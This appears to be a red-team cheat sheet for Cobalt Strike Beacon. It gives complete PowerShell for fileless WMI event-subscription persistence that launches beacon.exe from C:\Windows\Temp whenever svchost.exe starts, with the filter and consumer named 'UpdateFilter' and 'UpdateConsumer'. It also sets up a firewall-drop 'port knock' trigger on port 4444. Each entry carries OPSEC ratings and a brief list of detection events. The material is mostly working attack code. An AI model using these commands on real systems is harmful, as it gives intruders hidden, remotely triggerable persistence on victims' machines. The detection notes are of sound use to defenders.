### WMI Persistent Event — CommandLineEventConsumer (OPSEC-CAUTION)
**Environment:** CS Beacon (powerpick)
**OPSEC:** CAUTION
**Purpose:** Fileless persistence via WMI event subscription

```powershell
# Filter
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='UpdateFilter'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='svchost.exe'"}
# Consumer
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name='UpdateConsumer'; CommandLineTemplate='C:\Windows\Temp\beacon.exe'}
# Binding
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
```
**Notes:** No file on disk — stored in WMI repository. Detected via Sysmon EID 19/20/21 and WMI-Activity EID 5861.

### WMI Remote Trigger — Port Knock via Firewall Drop (OPSEC-CAUTION)
**Environment:** CS Beacon (powerpick)
**OPSEC:** CAUTION
**Purpose:** Trigger payload execution remotely by sending a packet to a specific port

```powershell
# Enable audit policy
shell auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable
# Filter on Event 5152 (firewall drop) for port 4444
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='PortKnock'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.LogFile='Security' AND TargetInstance.EventCode=5152 AND TargetInstance.Message LIKE '%4444%'"}
```
**Notes:** Clever technique — trigger is a blocked packet, no open port required. Leaves audit policy change in Security log.
